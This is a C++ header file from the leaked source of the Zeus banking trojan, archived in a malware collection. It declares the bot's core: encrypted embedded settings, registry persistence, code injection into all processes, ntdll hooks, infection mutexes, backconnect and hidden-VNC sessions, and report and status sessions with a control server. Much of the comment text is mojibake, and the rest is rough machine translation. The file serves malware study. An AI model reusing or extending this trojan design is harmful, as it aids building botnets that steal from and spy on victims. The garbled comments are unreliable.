/*
  name      Zeus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
/*
  ���� �������, �������� �������������.

  ���������� ��������� coreData.modules.kernel32:
  � ������� ��� ������� ���� � ������ �������� ���������� kernel32.dll ����� ���� �� ���������,
  � ������ ����������. ������ �� ������ ����������� �����, ��� ��������������� ���������
  kernel32.dll ����������� ������ � ntdll.dll, � ������������ �� ���� �������� �� �����.
*/
#pragma once

#include "..\common\malwaretools.h"
#include "..\common\ntdll.h"
#include "..\common\wininet.h"
#include "..\common\generateddata.h"

//The buffer size in characters for the registry value.
#define CORE_REGISTRY_VALUE_BUFFER_SIZE 10       

//The buffer size in characters for the registry key.
#define CORE_REGISTRY_KEY_BUFFER_SIZE (sizeof(PATH_REGKEY) + CORE_REGISTRY_VALUE_BUFFER_SIZE + 1)

//Settings are stored in the PE file.
#pragma pack(push, 1)
typedef struct
{
  //Binding.
  DWORD size;           //Full size settings.
  WCHAR compId[60];     //CompID.
  GUID guid;            //Binary GUID association with the OS.
  Crypt::RC4KEY rc4Key; //Encryption key for the OS.

  //Data on the waterways.
  struct
  {
    char coreFile[20];                                      //Otnostileny path loader. (6 (dir) + 1 (/) + 5 (name) + 4 (. Exe) + 1 (\ 0))
    char reportFile[20];                                    //Otnostileny way for the reports. (6 (dir) + 1 (/) + 5 (name) + 4 (. Ext) + 1 (\ 0))
    char regKey[CORE_REGISTRY_VALUE_BUFFER_SIZE];           //Relative path in the registry. (6 (dir))
    char regDynamicConfig[CORE_REGISTRY_VALUE_BUFFER_SIZE]; //Zanchenie in the registry to store kontsiguratsii.
    char regLocalConfig[CORE_REGISTRY_VALUE_BUFFER_SIZE];   //Zanchenie in the registry to store the local configuration.
    char regLocalSettings[CORE_REGISTRY_VALUE_BUFFER_SIZE]; //Zanchenie in the registry to store settings.
  }userPaths;

  DWORD processInfecionId; //ID to generate myuteksa infected processes.
  DWORD storageArrayKey;   //XOR key for storing records.
}PESETTINGS;
#pragma pack(pop)

//The structure contains the basic data for the current process.
typedef struct
{
  //////////////////////////////////////////////////// //////////////////////////////////////////////
  // 'On_all' - updated at every startup.
  // 'On_copy' - are updated in the copy module. And just as on_start.
  // 'On_start' - change only if nomarlnom start, otherwise saved from the module into the module.
  //////////////////////////////////////////////////// //////////////////////////////////////////////

  /*on_copy*/DWORD proccessFlags; //Personal data of the process.

  //Of the current user.
  struct
  {
    /*on_all*/TOKEN_USER *token; //Token tekusheyu user.
    /*on_all*/DWORD sidLength;   //Length of SID in pTokenUser.
    /*on_all*/DWORD id;          //CRC32 for the SID in pTokenUser.
    /*on_all*/DWORD sessionId;   //Session ID.
  }currentUser;

  struct
  {
    /*on_copy*/HMODULE current;
    /*on_all*/ HMODULE kernel32;
    /*on_all*/ HMODULE ntdll;
  }modules;

  //Options to import from ntdll.dll.
# pragma pack(push, 1)
  struct
  {
    /*on_all*/ntdllNtCreateThread            ntCreateThread;      //Check for NULL, before access.
    /*on_all*/ntdllNtCreateUserProcess       ntCreateUserProcess; //Check for NULL, before access.
    /*on_all*/ntdllNtQueryInformationProcess ntQueryInformationProcess;
    /*on_all*/void *                         rtlUserThreadStart;
#   if(0)
    /*on_all*/ntdllNtQueryDirectoryFile      ntQueryDirectoryFile;
#   endif
#   if defined HOOKER_LDRLOADDLL
    /*on_all*/ntdllLdrLoadDll                ldrLoadDll;
    /*on_all*/ntdllLdrGetDllHandle           ldrGetDllHandle;
#   endif
#   if defined HOOKER_NTCREATEFILE
    /*on_all*/ntdllNtCreateFile              ntCreateFile;
#   endif
  }ntdllApi;
# pragma pack(pop)

  //Access attributes.
  struct
  {
    /*on_all*/SECURITY_ATTRIBUTES saAllowAll;
    /*on_all*/SECURITY_DESCRIPTOR sdAllowAll;
    /*on_all*/void *buf;
  }securityAttributes;

  //Way.
  struct
  {
    /*on_all*/LPWSTR process;         //Full path tekusheyu file.
    /*on_start*/WCHAR home[MAX_PATH]; //Home directory.
  }paths;

  /*on_all*/DWORD winVersion;           //WINDOWS version.
  /*on_all*/BYTE integrityLevel;        //The application layer.
  /*on_all*/DWORD pid;                  //ID of this process.
  /*on_all*/LPSTR httpUserAgent;        //HTTP user-agent, before accessing the variable must
                                        //call Core:: initHttpUserAgent ();
  /*on_start*/GUID osGuid;              //GUID for the OS.
  /*on_start*/PESETTINGS peSettings;    //These data are stored encrypted and can be accessed through
                                        //Core:: getPeSettings (). WARNING! Core:: init () does not receive
                                        //its own.
  /*on_start*/WCHAR installId[40];      //ID instyalatora for installation as updatings.
  
  //The data for the acceleration of finding a base configuration.
  struct
  {
    /*on_start*/DWORD xorKey;   //XOR key (size greater than or equal size).
  }baseConfigInfo;

  //Global objects.
  struct
  {
    /*on_copy*/HANDLE stopEvent;        //Signal to stop the flow globalnyh bot.
    /*on_copy*/HANDLE stopedEvent;      //Signal to stop the flow globalnyh bot. While atualno
                                        //only wow64.
  }globalHandles;
}COREDATA;
extern COREDATA coreData;

namespace Core
{
  //ID objects.
  enum
  {
    OBJECT_ID_LOADER                = 0x32901130, //Bootloader code into all processes (Myuteks).
    OBJECT_ID_LOADER_READY          = 0x1A43533F, //The loader code is loaded (the event).
    OBJECT_ID_INSTALLER             = 0x8889347B, //Installer bot system (Myuteks).
    OBJECT_ID_CONTROL_INFECTION     = 0x19367401, //Flow control status bot (infection threads myuteks).
    OBJECT_ID_CONTROL_AUTORUN       = 0x19367402, //Flow control status bot (auto, myuteks).
    OBJECT_ID_TCP_SERVER            = 0x743C152E, //TCP stream server (Myuteks).
    OBJECT_ID_BACKCONNECT_CONTROL   = 0x743C1521, //Flow control backconect soddineny (Myuteks).
    OBJECT_ID_SERVER_SESSION_REPORT = 0x78D0C214, //The flow of the sessions with the server to send reports (Myuteks).
    OBJECT_ID_SERVER_SESSION_STATUS = 0x78D0C215, //The flow of the sessions with the server to send status (Myuteks).
    OBJECT_ID_DYNAMIC_CONFIG        = 0x909011A5, //Flow update the dynamic configuration (Myuteks).
    OBJECT_ID_BOT_STATUS            = 0x84939312, //Bot status on the current system (ID).
    OBJECT_ID_BOT_STATUS_SECRET     = 0x78F16360, //Bot status on the current system (ID).
    OBJECT_ID_REG_AUTORUN           = 0xFF220829, //Startup Objects (the Register).
    OBJECT_ID_REPORTFILE            = 0x8793AEF2, //Access to the log file (Myuteks).
    OBJECT_ID_LOCALCONFIG           = 0x12E82136, //Access to local configuration in the registry (Myuteks).
    OBJECT_ID_LOCALSETTINGS         = 0x12E82137, //Access to the Local Settings in the registry (Myuteks).
    OBJECT_ID_REMOTESCRIPT          = 0x8387A395, //Execution of this script (Myuteks).
    OBJECT_ID_VNC_MESSAGE           = 0x84889911, //Window message for VNC.
    OBJECT_ID_VNC_EVENT             = 0x84889912, //Event window message to VNC (event).
    OBJECT_ID_VNC_PAINT_MUTEX       = 0x1898B122, //Myuteks risnovaniya windows VNC (Myuteks).
    OBJECT_ID_VNC_DESKTOP           = 0x2937498D, //Desktop for VNC.
    OBJECT_ID_VNC_MAPFILE           = 0x9878A222, //Map-file for VNC (Object).
    OBJECT_ID_VNC_GLOBALDATA_MUTEX  = 0x18782822, //Myuteks access to global objects VNC (Myuteks).
  };
  
  //Flags for coreData.processFlags.
  enum
  {
    /*
      ������� ��� WOW64, ���� ����� ������������ ������ ��� ������������ � INITF_NORMAL_START. 
    */
#   if !defined _WIN64
    CDPF_WOW64                            = 0x001,
#   endif
    
    /*
      ���� �������� ������ ��� ������������� � ��������� �������� ����. ��������� �� ��������
      ExitProcess() � ��������� ������ ����, � ������ ����� ������� Sleep(INIFINITE).
    */
    CDPF_NO_EXITPROCESS                   = 0x002,
    
    /*
      ������� ��� VNC-��������.
    */
#   if(BO_VNC > 0)    
    CDPF_VNC_ACTIVE                       = 0x004,
#   endif    

    /*
      ��������� �������� ���������.
    */
    CDPF_DISABLE_CREATEPROCESS            = 0x010,
    
    /*
      ����� �������� �� ������� TCP �������.
    */
    CDPF_RIGHT_TCP_SERVER                 = 0x020,

    /*
      ����� �������� �� ��������� ���������� � ��������.
    */
    CDPF_RIGHT_SERVER_SESSION             = 0x040,

    /*
      ����� �������� �� ������������ ��������� ����.
    */
    CDPF_RIGHT_CONTROL                    = 0x080,

    /*
      ����� �������� �� ���������.
    */
    CDPF_RIGHT_BACKCONNECT_SESSION        = 0x100,
    
    /*
      ��� �����.
    */
    CDPF_RIGHT_ALL                        = CDPF_RIGHT_TCP_SERVER |
                                            CDPF_RIGHT_SERVER_SESSION |
                                            CDPF_RIGHT_CONTROL |
                                            CDPF_RIGHT_BACKCONNECT_SESSION,

  /*
    �����, ������� ������ ������������� �� �������� � ��������.
  */
  CDPT_INHERITABLE_MASK                   = CDPF_DISABLE_CREATEPROCESS   
#                                           if(BO_VNC > 0)    
                                            | CDPF_VNC_ACTIVE
#                                           endif    
  };

  //Flags to init ().
  enum
  {
    INITF_NORMAL_START        = 0x0, //Run the code as a process.
    INITF_INJECT_START        = 0x1, //Running code as an injection produce.
    INITF_HOOKS_FOR_USER      = 0x2, //Set polhovatelskie hooks.
  };
  
  //Types for getPeSettingsPath ().
  enum
  {
    PSP_QUICKSETTINGSFILE, //Currently, just a file browser homepage.
    PSP_COREFILE,          //PESETTINGS:: userPaths.core.
    PSP_REPORTFILE,        //PESETTINGS:: userPaths.other.

    PSP_REGKEY             //PESETTINGS:: userPaths.regKey.

  };

  //Types for getBinaryDataFromRegistry ().
  enum
  {
    RV_DYNAMICCONFIG, //PESETTINGS:: userPaths.regDynamicConfig.

    RV_LOCALCONFIG,   //PESETTINGS:: userPaths.regLocalConfig.

    RV_LOCALSETTINGS  //PESETTINGS:: userPaths.regLocalSettings.

  };

  //Message types for showInfoBox ().
  enum
  {
    SIB_BOT_INFO,         //Basic information on paper.
    SIB_CRYPT_PROTECTION, //Sobbschienie on the wrong crypt.
  };

  /*
    �������������.

    IN flags - ����� INITF_*. ����� INITF_HOOKS_FOR_*, �� ����� �������������� ������������.

    Return   - true - � ������ ������,
               false - � ������ ������.

    ���������: uninit() ������� ���������� �� �������� �� ������������ �������� ���� �������.
  */
  bool init(DWORD flags);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ������������� coreData.httpUserAgent. ���������� �������� ��� ������� ����� �������� � 
    coreData.httpUserAgent.
  */
  void initHttpUserAgent(void);

  /*
    ��������� �������� �� ��������� ��� Wininet::CALLURLDATA.

    OUT cud - ��������� ��� ���������.
  */
  void initDefaultCallUrlData(Wininet::CALLURLDATA *cud);

  /*
    �������� ����������� ������� ��������.

    IN pid - ID ��������.

    Return - ����� ������� � ������ ������,
             NULL - ���� ������ ��� ���������, ��� ��������� ������.
  */
  HANDLE createMutexOfProcess(DWORD pid);

  /*
    ��������� ����� ������� ����.

    IN id              - OBJECT_ID_*.
    OUT buffer         - ��� (����� �� ����� 50 ��������).
    IN objectNamespace - MalwareTools::KON_*.
  */
  void generateObjectName(DWORD id, LPWSTR buffer, BYTE objectNamespace);

  /*
    �������� ������������ ������� � ��� ������.

    IN id              - OBJECT_ID_*.
    IN objectNamespace - MalwareTools::KON_*.

    Return             - ����� �������.

    ����������: ��� ������������ ������� ���������� ������� Sync::_freeMutex().
  */
  HANDLE waitForMutexOfObject(DWORD id, BYTE objectNamespace);
  
  /*
    ������������� ����� ����� ������.

    IN process       - �������.
    IN processMutex  - ������ ������ ��������.
    IN proccessFlags - ������ ��� ������ coreData.proccessFlags, ������ ������ ����������� �� �����
                       CDPT_INHERITABLE_MASK.

    Return           - ����� ������ � �������� process � ������ ������,
                       NULL - � ������ ������.
  */
  void *initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFlags);

  /*
    ��������� ����������� ��������� �� ��������� ������� ��� �������� ��������.
    
    Return - ������������ ����� ������ SEM_*.
  */
  DWORD disableErrorMessages(void);

  /*
    ������� ������������ ������� �� �����������, ���� ����� ������������� ����� coreData.

    IN oldFunction - ����� ������� �������.
    IN newFunction - ����� ����� �������.
  */
  void replaceFunction(const void *oldFunction, const void *newFunction);

  /*
    ������� ��� ��������, ��� ������ ���� �������� �������� � ������ ������������� ����������.
    (��������� ���� ��� ��� ����� �������� ����� ����� �������,���� ����� �� �������).

    Return - true - �������,
             false - �� �������.
  */
  bool isActive(void);
  
  /*
    ����������� �������, ����� ��������� �� ������������ ���������.

    IN p - �������.
  */
  void _destroyFunction(void *p);

  /*
    ��������� ������������ ����������.

    OUT buf - ����� ��� ������������, ��� ������� 60 ��������.
  */
  void _generateBotId(LPWSTR buf);

  /*
    ��������� ������� ������������.
    
    OUT bc - BASECONFIG.
  */
  void getBaseConfig(BASECONFIG *bc);

  /*
    ��������� PESETTINGS.
    
    OUT ps - PESETTINGS.
  */
  void getPeSettings(PESETTINGS *ps);

  /*
    �������� ������ ���� ��� ���� ���������� � PESETTINGS.

    IN type  - ��� PSP_*.
    OUT path - ����.
  */
  void getPeSettingsPath(DWORD type, LPWSTR path);
  
  /*
    �������� ��������� ������ ������� ��� BDR_*.

    IN type   - ��� �������� RV_*.
    OUT key   - ���� �������. ������ ������ CORE_REGISTRY_KEY_BUFFER_SIZE.
    OUT value - �������� �������. ������ ������ CORE_REGISTRY_VALUE_BUFFER_SIZE.
  */
  void getRegistryValue(DWORD type, LPWSTR key, LPWSTR value);
  
  /*
    ��������� ����� �������� �������.

    OUT name - ������.
  */
  void getCurrentBotnetName(LPWSTR name);
  
  /*
    ��������� ������ �� �������.
    
    IN image           - ������.
    IN OUT overlaySize - �� ����� - ������ ������, �� ������ ������ ������ �������.

    Return             - �������, ����� ���������� ����� Mem. ��� NULL - � ������ ������.
  */
  void *getBaseOverlay(const void *mem, LPDWORD size);
  
  /*
    ���������� ������ � �������.

    IN image    - ������.
    IN size     - ������ ������.
    IN data     - �������.
    IN dataSize - ������ �������.

    Return      - true - � ������ ������,
                  false - � ������ ������.
  */
  bool setBaseOverlay(void *mem, DWORD size, const void *data, DWORD dataSize);

  /*
    �������� ������� ������� ���� � ������ ��������.

    IN waitStop - true - ������� ���������� ���� ������� ��������,
                  false - ����� �� ������� ����� ����� �������� ��������.
  */
  void createServices(bool waitStop);

  /*
    ����������� �������� �����.
  */
  bool destroyUser(void);

  /*
    ����� ���������� � ������ ����.

    IN type - SIB_*.
    
    Return  - true - � ������ ������,
              false - � ������ ������.
  */
  bool showInfoBox(BYTE type);

  /*
    ����� ����� ������� � �������� ����� ����� ������.

    Return - ��� ��������.
  */
  int WINAPI _injectEntryForModuleEntry(void);

  /*
    ����� ����� ������� � �������� ����� ����� ������.

    Return - ��� ��������.
  */
  DWORD WINAPI _injectEntryForThreadEntry(void *);

  /*    The main entry point.
  */
  void WINAPI _entryPoint(void);
};
